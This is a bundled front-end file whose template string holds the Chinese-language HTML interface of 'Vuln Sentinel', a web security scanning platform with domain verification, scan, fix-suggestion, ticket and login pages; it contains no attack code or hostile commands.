(function(){const i=document.createElement("link").relList;if(i&&i.supports&&i.supports("modulepreload"))return;for(const r of document.querySelectorAll('link[rel="modulepreload"]'))s(r);new MutationObserver(r=>{for(const o of r)if(o.type==="childList")for(const a of o.addedNodes)a.tagName==="LINK"&&a.rel==="modulepreload"&&s(a)}).observe(document,{childList:!0,subtree:!0});function t(r){const o={};return r.integrity&&(o.integrity=r.integrity),r.referrerPolicy&&(o.referrerPolicy=r.referrerPolicy),r.crossOrigin==="use-credentials"?o.credentials="include":r.crossOrigin==="anonymous"?o.credentials="omit":o.credentials="same-origin",o}function s(r){if(r.ep)return;r.ep=!0;const o=t(r);fetch(r.href,o)}})();const Li=`</head>

<body>

<a href="#page-home" class="skip-link">跳转到主内容</a>



<!-- Skeleton 加载 Screen -->

<div id="skeleton-screen" class="skeleton-screen">

  <div class="skeleton-topbar">

    <div class="skeleton-topbar-logo"></div>

    <div class="skeleton-topbar-line"></div>

  </div>

  <div class="skeleton-search"></div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

  <div class="skeleton-card">

    <div class="skeleton-card-title"></div>

    <div class="skeleton-card-line"></div>

    <div class="skeleton-card-line short"></div>

  </div>

</div>





<!-- Toast Container -->

<div class="toast-container" id="toast-container"></div>



<!-- AI Advisor Floating Button -->

<button class="ai-fab" id="ai-fab" onclick="toggleAIChat()" aria-label="打开安全顾问" title="安全顾问">

  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:22px;height:22px"><path d="M12 2a8 8 0 0 1 8 8v4a8 8 0 0 1-16 0v-4a8 8 0 0 1 8-8z"/><circle cx="9" cy="10" r="1" fill="currentColor"/><circle cx="15" cy="10" r="1" fill="currentColor"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/></svg>

  <span class="ai-fab-badge" id="ai-fab-badge" style="display:none">0</span>

</button>



<!-- AI Advisor Chat Window -->

<div class="ai-chat" id="ai-chat">

  <div class="ai-chat-header">

    <div class="ai-chat-header-info">

      <div class="ai-avatar" style="background:var(--primary);color:#fff;display:flex;align-items:center;justify-content:center;width:28px;height:28px">VS</div>

      <div>

        <div style="font-size:13px;font-weight:600">安全顾问</div>

        <div style="font-size:11px;color:#808080">在线服务中</div>

      </div>

    </div>

    <button class="ai-chat-close" onclick="toggleAIChat()" aria-label="关闭">×</button>

  </div>

  <div class="ai-chat-body" id="ai-chat-body">

    <div id="ai-offline-notice" style="display:none;padding:8px 10px;background:#313335;border:1px solid #555555;border-radius:2px;font-size:12px;color:var(--text-secondary);text-align:center;margin-bottom:8px">

      当前使用本地规则引擎；配置 LLM 接口密钥 后回答更精准。

    </div>

    <div class="ai-msg bot">

      安全顾问随时在线，可以帮你解读漏洞、生成修复建议、梳理扫描证据，并提示哪些结果待复测。<br><br>

      快捷问题

    </div>

  </div>

  <div class="ai-quick" id="ai-quick">

    <button onclick="askAIQuick('HSTS 是什么？')">HSTS 是什么</button>

    <button onclick="askAIQuick('怎么修 CSP？')">修复 CSP</button>

    <button onclick="askAIQuick('敏感文件怎么防？')">敏感文件</button>

    <button onclick="askAIQuick('SQL 注入怎么防？')">SQL 注入</button>

    <button onclick="askAIQuick('XSS 是什么？')">XSS 漏洞</button>

  </div>

  <div class="ai-chat-input">

    <input type="text" id="ai-input" placeholder="输入安全问题…" maxlength="200" onkeydown="if(event.key==='Enter')sendAIMessage()" />

    <button onclick="sendAIMessage()" aria-label="发送">发送</button>

  </div>

</div>



<div class="page active" id="page-home" role="main">

  <div class="home-hero card fade-in-up">

    <div class="home-hero-top">
      <div class="home-brand-dot"></div>
      <div class="home-brand-title">Vuln Sentinel</div>
    </div>

    <h1 class="home-hero-title">Vuln Sentinel Web 安全检测平台</h1>
    <div class="home-hero-version">Version 11-S</div>

    <div class="home-hero-actions">
      <button onclick="navigateTo('home')" class="home-hero-icon" aria-label="首页">⌂</button>
      <button onclick="navigateTo('scan')" class="home-hero-icon" aria-label="扫描">↗</button>
      <button onclick="navigateTo('profile')" class="home-hero-icon" aria-label="账号">◉</button>
    </div>

    <div class="home-hero-footer">仅用于授权范围内的安全检测、交付复测、整改跟踪与持续巡检。</div>
  </div>



  <div id="home-onboarding-banner" class="card fade-in-up" style="display:none;margin-top:14px;padding:14px;border:1px solid rgba(75,110,175,0.35);background:linear-gradient(135deg, rgba(75,110,175,0.12), rgba(115,201,144,0.08))">

    <div style="display:flex;justify-content:space-between;gap:16px;align-items:flex-start;flex-wrap:wrap">

      <div style="min-width:240px;flex:1">

        <div style="font-size:13px;font-weight:700;color:var(--text-primary);margin-bottom:6px">3 步开始一次正式检测</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.7">① 输入授权目标并确认范围 → ② 查看风险、证据、影响与整改建议 → ③ 复测、留档并导出正式报告。

        适合客户沟通、交付前验收、持续巡检与复修闭环。</div>

      </div>

      <div style="display:flex;gap:8px;flex-wrap:wrap">

        <button onclick="navigateTo('scan')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">开始扫描</button>

        <button onclick="navigateTo('profile')" style="background:rgba(75,110,175,0.12);color:var(--primary);border:1px solid rgba(75,110,175,0.35);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">账号设置</button>

        <button onclick="navigateTo('audit')" style="background:rgba(115,201,144,0.12);color:#73c990;border:1px solid rgba(115,201,144,0.35);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:600">上线审计</button>

        <button onclick="dismissHomeOnboarding()" style="background:transparent;color:var(--text-secondary);border:1px solid var(--border);padding:8px 14px;border-radius:2px;cursor:pointer;font-size:13px">不再提示</button>

      </div>

    </div>

    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-top:14px">

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">适合谁</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">安全团队、研发、运维、甲方安全负责人</div>

      </div>

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">产出什么</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">可直接用于客户、管理层与研发协同的正式结果报告</div>

      </div>

      <div style="padding:10px 12px;background:rgba(60,63,65,0.7);border:1px solid var(--border);border-radius:2px">

        <div style="font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:4px">闭环能力</div>

        <div style="font-size:12px;color:var(--text-secondary);line-height:1.6">扫描、证据、修复、验证、工单、复测一条线打通</div>

      </div>

    </div>

  </div>



  <!-- 核心数据总览 -->

  <div class="card fade-in-up dashboard-stats" style="margin-top:14px;padding:12px;background:#3c3f41;border:1px solid #555555">

    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;text-align:center">

      <div class="stat-cell">

        <div class="stat-value" style="color:#73c990" id="home-stat-scan-count">-</div>

        <div class="stat-label">总扫描次数</div>

        <div class="stat-sub">真实运行记录</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#4b6eaf" id="home-stat-high-risk">-</div>

        <div class="stat-label">高风险发现</div>

        <div class="stat-sub">需要优先处理</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#f0a732" id="home-stat-fixed-count">-</div>

        <div class="stat-label">已修复项</div>

        <div class="stat-sub">复测确认关闭</div>

      </div>

      <div class="stat-cell">

        <div class="stat-value" style="color:#c75450" id="home-stat-score">-</div>

        <div class="stat-label">最近评分</div>

        <div class="stat-sub">最近一次扫描</div>

      </div>

    </div>

  </div>



  <!-- 11-S: 技术亮点（最醒目的位置） -->

  <div class="card fade-in-up" style="margin-top:18px;background:#3c3f41;border:1px solid #555555;border-radius:2px;overflow:hidden">

    <!-- 顶部标题栏 -->

    <div style="padding:12px 12px 10px;background:#313335;border-bottom:1px solid #555555">

      <div style="display:flex;align-items:center;gap:10px">

        <div style="flex:1">

          <div style="font-size:13px;font-weight:600;color:#bbbbbb">交付闭环：体检 → 证据定位 → 修复建议 → 复测验证 → 报告留档</div>

          <div style="font-size:11px;color:#808080;margin-top:2px">多平台修复建议 · 证据分层展示 · 导出客户交付报告</div>

        </div>

        <span style="font-size:10px;background:#4b6eaf;color:#fff;padding:2px 8px;border-radius:2px;font-weight:600">11-S 核心能力</span>

      </div>

    </div>

    <!-- 三大技术亮点 -->

    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:#555555;margin:0">

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">置信度分级</div>

        <div style="font-size:11px;color:#808080;line-height:1.5">高/中/低三级标注<br>辅助优先级排序</div>

      </div>

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">反馈闭环</div>

          <div style="font-size:11px;color:#808080;line-height:1.5">用户反馈结果<br>持续优化检测模型</div>

      </div>

      <div style="padding:12px 10px;background:#3c3f41;text-align:center">

        <div style="font-size:12px;font-weight:600;color:#bbbbbb;margin-bottom:4px">安全闭环</div>

        <div style="font-size:11px;color:#808080;line-height:1.5">体检 → 风险定位 → 修复建议 → 复测 → 交付</div>

      </div>

    </div>

    <!-- 本地扫描入口（登录后显示） -->

  </div>



  <!-- 风险趋势图 -->

  <div class="card fade-in-up" style="margin-top:18px">

    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">

      <strong style="font-size:14px;color:var(--text-primary)">风险趋势</strong>

      <div style="display:flex;gap:6px">

        <button onclick="loadTrendChart(7)" class="trend-range" data-days="7" style="padding:4px 10px;min-height:0;font-size:12px;border:1px solid #555555;background:#45494a;border-radius:2px;cursor:pointer;color:#808080;font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace">7天</button>

        <button onclick="loadTrendChart(30)" class="trend-range" data-days="30" style="padding:4px 10px;min-height:0;font-size:12px;border:1px solid #555555;background:#45494a;border-radius:2px;cursor:pointer;color:#808080;font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace">30天</button>

      </div>

    </div>

    <div id="trend-chart" style="min-height:120px;display:flex;align-items:center;justify-content:center;color:var(--text-secondary);font-size:12px">扫描几个目标后，即可查看分数变化趋势。</div>

  </div>





  <section id="scan-section" class="scan-section card fade-in-up" style="animation-delay:0.1s">

    <h2 class="card-title">安全扫描</h2>

    <p class="card-desc">输入授权目标并确认范围后开始体检，结果会进入报告、审计和复测闭环。</p>



    <!-- 仪表盘概览（已登录时显示） -->

    <div id="dashboard-overview" style="display:none;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px">

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#4b6eaf" id="stat-total">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">总扫描次数</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#c75450" id="stat-high">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">高风险</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#73c990" id="stat-fixed">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">已修复</div></div>

      <div class="stat-card" style="background:#313335;padding:12px;border:1px solid #555555;border-radius:2px;text-align:center"><div style="font-family:'JetBrains Mono','Consolas','Monaco','Courier New',monospace;font-size:22px;font-weight:600;color:#f0a732" id="stat-score">-</div><div style="font-size:11px;color:#808080;margin-top:6px;text-transform:uppercase;letter-spacing:0.3px">最近评分</div></div>

    </div>



    <!-- 11-S: 安全趋势面板 -->

    <div id="trend-panel" style="display:none;margin-bottom:20px">

      <div class="card" style="padding:16px">

        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px">

          <div style="display:flex;align-items:center;gap:8px">

            <h3 style="margin:0;font-size:15px;font-weight:700">安全评分趋势</h3>

          </div>

          <div id="trend-summary" style="display:flex;gap:12px;flex-wrap:wrap"></div>

        </div>

        <div id="trend-chart-container" style="position:relative;width:100%;height:200px;background:#313335;border:1px solid #555555;border-radius:2px;overflow:hidden">

          <canvas id="trend-canvas" style="width:100%;height:100%"></canvas>

          <div id="trend-empty" style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:var(--text-secondary);font-size:13px">暂无扫描数据，完成首次扫描后即可查看趋势</div>

        </div>

        <div id="trend-legend" style="display:flex;gap:12px;margin-top:10px;flex-wrap:wrap"></div>

      </div>

    </div>



    <!-- Step 1: Input URL -->

    <div id="verify-step-1" class="verify-step">

      <div class="verify-step-header">

        <span class="verify-num">1</span>

        <span>输入目标网址</span>

      </div>

      <div class="scan-input-wrap">

        <input id="scan-url" type="url" placeholder="例如：https://示例.com" aria-label="目标网址" oninput="updateScanStartState()" />

      </div>

      <div id="scan-login-tip" style="background:#313335;border:1px solid #555555;border-radius:2px;padding:10px 14px;margin-bottom:10px;text-align:center;display:none">

        <div style="font-size:12px;color:var(--text-secondary);margin-bottom:6px">登录后即可开始体检，结果会自动进入报告、工单和审计记录</div>

        <button onclick="navigateTo('profile')" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:6px 18px;border-radius:2px;cursor:pointer;font-size:13px;font-weight:500">立即登录 / 注册</button>

      </div>

      <div id="scan-credits-hint" style="display:none;background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.25);border-radius:2px;padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text-secondary);line-height:1.6">

        <strong style="color:var(--primary)">额度提示</strong><br/>

        当前额度：<span id="scan-credits-value">--</span> · 标准扫描消耗 1 · 深度扫描消耗 3

      </div>

      <label class="scan-checkbox" style="margin-bottom:12px">

        <input id="auth-check-step1" type="checkbox" onchange="updateScanStartState()" />

        <span>我已确认目标属于授权范围，不涉及受限目标</span>

      </label>

      <button class="scan-btn" id="scan-btn-step1" onclick="startScanDirect()" disabled>开始体检并生成报告</button>

      <div style="text-align:center;margin-top:10px">

        <button onclick="goVerifyStep2()" style="background:none;border:none;color:var(--primary);font-size:13px;padding:8px;cursor:pointer">域名归属验证（推荐）</button>

        <div style="font-size:12px;color:var(--text-secondary);margin-top:4px">快速演示仅适用于自有目标或授权场景，正式交付建议完成归属验证与复测留档</div>

      </div>

      <div style="text-align:center;margin-top:8px">

        <button onclick="showBatchScanModal()" style="background:none;border:1px dashed var(--border);color:var(--text-secondary);padding:8px 16px;border-radius:2px;cursor:pointer;font-size:12px;width:100%">批量体检（一次最多 5 个 URL，适合交付前巡检）</button>

      </div>

    </div>



    <!-- Step 2: Generate Verification 令牌 -->

    <div id="verify-step-2" class="verify-step" style="display:none">

      <div class="verify-step-header">

        <span class="verify-num">2</span>

        <span>域名归属验证</span>

      </div>

      <p class="verify-desc">请选择一种验证方式，在目标网站添加以下验证信息：</p>

      <div class="令牌-box">

        <label>验证 令牌</label>

        <code id="verify-令牌">vuln-sentinel-xxxx</code>

        <button class="令牌-copy-btn" onclick="copyToken()" aria-label="复制验证令牌">复制</button>

      </div>

      <div class="verify-methods">

        <div class="verify-method" onclick="selectVerifyMethod(this, 'dns')">

          <strong>DNS TXT 验证</strong>

          <p>添加 TXT 记录：<code id="dns-record">_vuln-sentinel.example.com TXT "vuln-sentinel-xxxx"</code></p>

        </div>

        <div class="verify-method" onclick="selectVerifyMethod(this, 'file')">

          <strong>网站文件验证</strong>

          <p>在网站根目录创建文件：<code>vuln-sentinel-verification.txt</code>，内容为 令牌</p>

        </div>

      </div>

      <div class="verify-method-selected" id="verify-method-info">

        <p>选择一种验证方式</p>

      </div>

      <button class="scan-btn" onclick="confirmVerification()" id="verify-confirm-btn" disabled>已添加验证信息，确认验证</button>

      <button onclick="skipVerification()" id="verify-skip-btn" style="background:none;border:none;color:var(--primary);font-size:13px;padding:10px;margin-top:6px;cursor:pointer;width:100%;text-align:center">快速测试（跳过 DNS/文件验证）</button>

    </div>



    <!-- Step 3: Ready to Scan -->

    <div id="verify-step-3" class="verify-step" style="display:none">

      <div class="verify-step-header done">

        <span class="verify-num done">OK</span>

        <span>准备开始扫描</span>

      </div>

      <div class="verify-passed">

        <p>已确认目标网址，勾选授权声明后开始扫描。</p>

        <div class="scan-input-wrap">

          <input id="scan-url-confirmed" type="url" readonly aria-label="已确认的目标网址" />

        </div>

        <label class="scan-checkbox">

          <input id="auth-check" type="checkbox" onchange="updateScanStartState()" />

          <span>我已确认目标属于授权范围，不涉及受限目标</span>

        </label>

        <div style="display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap">

          <span style="font-size:13px;color:var(--text-secondary)">扫描深度：</span>

          <div id="scan-depth-group" style="display:inline-flex;border:1px solid var(--border);border-radius:2px;overflow:hidden">

            <label class="scan-depth-opt" data-value="quick" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="quick" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" /> 快速

            </label>

            <label class="scan-depth-opt active" data-value="standard" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--primary);color:#fff;border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="standard" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" checked /> 标准

            </label>

            <label class="scan-depth-opt" data-value="deep" style="padding:6px 12px;cursor:pointer;font-size:12px;background:var(--bg);color:var(--text);border:none;user-select:none;-webkit-tap-highlight-color:transparent">

              <input type="radio" name="scan-depth" value="deep" style="position:absolute;opacity:0;pointer-events:none;width:0;height:0" /> 深度

            </label>

          </div>

          <span id="depth-hint" style="font-size:12px;color:var(--text-secondary);margin-left:4px">约 3-5 秒 · 推荐</span>

        </div>

        <button class="scan-btn" id="scan-btn" onclick="startScan()" disabled>开始体检并生成报告</button>

      </div>

    </div>

  </section>



  <!-- 公开样例报告 -->

  <div class="card public-report-card" id="public-report-card" style="margin-top:18px">

    <div class="card-title" style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">

      <div>

        <span style="font-size:13px">公开样例报告</span>

        <span style="font-size:12px;color:var(--text-secondary);margin-left:8px">无需登录，查看公开站点的样例检测结果</span>

      </div>

      <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap">

        <select id="public-report-host" onchange="loadPublicDemo()" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:5px 10px;border-radius:2px;font-size:12px;cursor:pointer">

          <option value="https://example.com">example.com</option>

          <option value="https://www.iana.org">iana.org</option>

          <option value="https://httpbin.org">httpbin.org</option>

          <option value="https://testphp.vulnweb.com">testphp.vulnweb.com（样例站点）</option>

        </select>

        <button onclick="loadPublicDemo()" id="public-report-refresh" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:5px 12px;border-radius:2px;font-size:12px;cursor:pointer;font-weight:500">刷新报告</button>

      </div>

    </div>

    <div id="public-report-content">

      <div style="padding:16px;text-align:center;color:var(--text-secondary);background:var(--bg);border-radius:2px;margin-top:12px;border:1px dashed var(--border)">

        <div style="font-size:12px;margin-bottom:8px;color:var(--text)">选择公开样例站点，立即查看检测结果</div>

        <div style="margin-top:10px"><button onclick="loadPublicDemo()" style="background:var(--primary);color:#fff;border:1px solid var(--primary-dark);padding:6px 14px;border-radius:2px;cursor:pointer;font-size:12px;font-weight:500">查看样例报告</button></div>

      </div>

    </div>

  </div>

</div>



<div class="page" id="page-result">

  <div class="workbench-header">

    <h1 class="workbench-title">扫描结果</h1>

    <span class="workbench-subtitle">查看风险发现、证据详情与整改建议</span>

  </div>

  <button class="back-btn" onclick="navigateTo('home')" style="margin-bottom:12px">返回首页</button>

  <div id="result-content"></div>

</div>



<div class="page" id="page-fixer">

  <div class="workbench-header">

    <h1 class="workbench-title">修复器</h1>

    <span class="workbench-subtitle">检查配置文件并生成安全加固补丁</span>

  </div>

  <button class="back-btn" onclick="navigateTo('home')" style="margin-bottom:12px">返回首页</button>



  <div class="card" style="margin-bottom:16px">

    <div class="card-title">输入配置</div>

    <p class="card-desc" style="margin-bottom:12px">粘贴 Nginx/Apache 配置文件，检测安全问题并生成修复补丁。</p>

    <textarea id="fixer-input" class="fixer-textarea" placeholder="粘贴服务器配置文件...&#10;&#10;例如：&#10;server {&#10;    listen 80;&#10;    server_name example.com;&#10;    ...&#10;}"></textarea>

    <div class="fixer-btns">

      <button class="fixer-btn primary" id="fixer-analyze-btn" onclick="analyzeFixer()">检查配置</button>

      <button class="fixer-btn secondary" onclick="loadSampleConfig()">载入参考配置</button>

      <button class="fixer-btn secondary" onclick="clearFixer()">清空</button>

    </div>

  </div>



  <div class="card" id="fixer-scan-prompt">

    <div class="card-title">使用上次扫描结果</div>

    <p style="font-size:13px;color:var(--text-secondary);line-height:1.8">

      1. 在<strong>扫描</strong>页面完成网站安全扫描<br>

      2. 扫描结果页点击<strong>"生成修复配置"</strong><br>

      3. 此处自动生成 Nginx、Python、Node.js、Apache 修复代码

    </p>

    <div class="fixer-btns" style="margin-top:12px">

      <button class="fixer-btn primary" id="goto-fixer-btn" onclick="goToFixerWithScanResult()" aria-label="生成修复配置">使用上次扫描结果生成</button>

    </div>

  </div>



  <div id="fixer-lang-tabs" style="display:none;margin:16px 0">

    <div style="display:flex;gap:6px;flex-wrap:wrap">

      <button class="fixer-btn primary lang-tab active" data-lang="nginx" onclick="switchFixLang('nginx')">Nginx</button>

      <button class="fixer-btn secondary lang-tab" data-lang="python" onclick="switchFixLang('python')">Python</button>

      <button class="fixer-btn secondary lang-tab" data-lang="nodejs" onclick="switchFixLang('nodejs')">Node.js</button>

      <button class="fixer-btn secondary lang-tab" data-lang="apache" onclick="switchFixLang('apache')">Apache</button>

    </div>

  </div>



  <div id="fixer-result"></div>

</div>



<!-- 进化页面 11-S -->

<div class="page" id="page-evolution">

  <div class="workbench-header">

    <h1 class="workbench-title">进化中心</h1>

    <span class="workbench-subtitle">历史学习与持续监控</span>

  </div>

  <div id="evolution-content" style="min-height:400px"></div>

</div>



<!-- 资产管理页面 -->

<div class="page" id="page-assets">

  <div class="workbench-header">

    <h1 class="workbench-title">资产管理</h1>

    <span class="workbench-subtitle">管理网站域名资产与扫描状态</span>

  </div>



  <!-- 添加资产表单 -->

  <div class="card" style="margin-bottom:16px">

    <div class="card-title">添加资产</div>

    <div class="settings-row-static" style="padding:14px 0 0 0;border-bottom:none;flex-wrap:wrap">

      <div style="flex:1;min-width:200px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">域名</label>

        <input type="text" id="asset-domain" placeholder="示例.com" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <div style="flex:1;min-width:160px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">负责人</label>

        <input type="text" id="asset-owner" placeholder="负责人姓名" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <div style="flex:2;min-width:200px">

        <label style="display:block;font-size:12px;color:var(--text-secondary);margin-bottom:4px">描述</label>

        <input type="text" id="asset-description" placeholder="资产描述（可选）" style="width:100%;padding:8px 10px;border:1px solid #646464;border-radius:2px;background:#45494a;color:#bbbbbb;font-size:13px" />

      </div>

      <button class="fixer-btn primary" data-action="add-asset" style="height:32px;padding:0 16px">添加</button>

    </div>

    <div id="asset-form-error" style="color:var(--danger);font-size:12px;margin-top:8px;display:none"></div>

  </div>



  <!-- 资产列表 -->

  <div class="card" id="asset-list-container">

    <div class="card-title">资产列表</div>

    <div id="asset-list" style="margin-top:10px"></div>

    <div id="asset-empty" class="ticket-empty" style="display:none">

      <div class="ticket-empty-icon"></div>

      <p>暂无资产</p>

      <p class="ticket-empty-hint">添加域名资产后可跟踪扫描状态</p>

    </div>

  </div>

</div>



<!-- 修复工单页面 -->

<div class="page" id="page-tickets">

  <div class="workbench-header">

    <h1 class="workbench-title">修复工单</h1>

    <span class="workbench-subtitle">跟踪和管理扫描发现的安全问题</span>

  </div>



  <!-- 状态标签页 -->

  <div class="ticket-tabs">

    <button class="ticket-tab active" data-action="switch-ticket-tab" data-status="pending">待修复</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="in_progress">修复中</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="fixed">已修复</button>

    <button class="ticket-tab" data-action="switch-ticket-tab" data-status="ignored">已忽略</button>

  </div>



  <!-- 批量操作 -->

  <div class="ticket-batch" id="ticket-batch-bar" style="display:none">

    <label class="ticket-batch-label"><input type="checkbox" id="ticket-select-all" data-action="toggle-select-all"> 全选</label>

    <span id="ticket-selected-count" class="ticket-selected-count">已选 0 项</span>

    <div class="ticket-batch-actions">

      <button class="ticket-batch-btn" data-action="batch-update" data-status="in_progress">标记修复中</button>

      <button class="ticket-batch-btn" data-action="batch-update" data-status="fixed">标记已修复</button>

      <button class="ticket-batch-btn secondary" data-action="batch-export">导出摘要</button>

      <button class="ticket-batch-btn secondary" data-action="batch-update" data-status="ignored">标记已忽略</button>

      <button class="ticket-batch-btn danger" data-action="batch-delete">删除</button>

    </div>

  </div>



  <!-- 工单工作台：左侧列表 / 右侧详情 -->

  <div class="ticket-workbench" id="ticket-workbench" style="display:none">

    <div class="ticket-list-panel">

      <div class="ticket-list-header">工单列表</div>

      <div class="ticket-table-wrap">

        <table class="ticket-table" id="ticket-table">

          <thead><tr><th style="width:30px"><input type="checkbox" id="ticket-select-all-table" data-action="toggle-select-all"></th><th>发现项</th><th>等级</th><th>状态</th><th>创建时间</th></tr></thead>

          <tbody id="ticket-list"></tbody>

        </table>

      </div>

    </div>

    <div class="ticket-detail-panel" id="ticket-detail-panel">

      <div class="ticket-detail-empty">选择左侧工单查看详情</div>

    </div>

  </div>



  <!-- 空状态 -->

  <div id="ticket-empty" class="ticket-empty" style="display:none">

    <div class="ticket-empty-icon"></div>

    <p>该状态下暂无工单</p>

    <p class="ticket-empty-hint">完成扫描后，高危/严重问题会自动创建工单，也可以从结果页手动转工单。</p>

    <div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:12px">

      <button class="fixer-btn primary" onclick="navigateTo('home')">去看报告</button>

      <button class="fixer-btn secondary" onclick="navigateTo('scan')">开始体检</button>

    </div>

  </div>

</div>



<div class="page" id="page-profile">

  <div class="workbench-header">

    <h1 class="workbench-title">设置</h1>

    <span class="workbench-subtitle">账号、主题与系统配置</span>

  </div>



  <!-- 登录/注册区域 -->

  <div id="auth-section">

    <!-- 未登录：显示登录/注册表单 -->

    <div id="auth-guest" style="display:none">

      <div class="card auth-form">

        <h3>账号登录</h3>

        <div class="auth-form-error" id="login-error"></div><div id="auth-status-message" class="auth-form-hint" style="margin-top:8px;color:var(--text-secondary)">可用受控测试账号登录，或直接使用你的账号。</div>

        <div class="auth-form-row">

          <input type="text" id="login-username" placeholder="用户名" aria-label="用户名" />

        </div>

        <div class="auth-form-row">

          <label for="login-password" class="sr-only">密码</label><input type="password" id="login-password" aria-label="密码" placeholder="密码" />

        </div>

        <div class="auth-form-row">

          <div id="auth-challenge-question" class="auth-form-hint" style="margin-bottom:8px">验证码加载中...</div>
          <input type="hidden" id="auth-challenge-token" />
          <input type="text" id="login-challenge-answer" placeholder="验证码答案（30秒有效）" aria-label="验证码答案（30秒有效）" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doLogin()">登 录</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="toggleAuthForm('reset')">找回密码</button>

        </div>

        <div class="auth-form-switch">

          <a onclick="toggleAuthForm('reset')">找回密码</a> · <a onclick="toggleAuthForm('register')">立即注册</a>

        </div>

      </div>

    </div>



    <!-- 重置密码表单 -->

    <div id="auth-reset" style="display:none">

      <div class="card auth-form">

        <h3>修改密码</h3>

        <div class="auth-form-error" id="reset-error"></div>

        <div class="auth-form-row">

          <input type="password" id="reset-new-password" placeholder="新密码（至少6位）" aria-label="新密码" />

        </div>

        <div class="auth-form-row">

          <input type="password" id="reset-new-password2" placeholder="确认新密码" aria-label="确认新密码" />

        </div>

        <div class="auth-form-row">

          <input type="text" id="reset-password-token" placeholder="重置令牌" aria-label="重置令牌" />

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn" style="flex:1" onclick="doResetPassword()">确认重置</button>

        </div>

        <div class="auth-form-row">

          <button class="auth-form-btn secondary" style="flex:1" onclick="toggleAuthForm('login')">返回登录</button>

        </div>

        <div class="auth-form-switch">

          <a onclick="toggleAuthForm('login')">返回登录</a>

        </div>

      </div>

    </div>



    <!-- 注册表单 -->

    <div id="auth-register" style="display:none">

      <div class="card auth-form">

        <h3>注册新账号</h3>

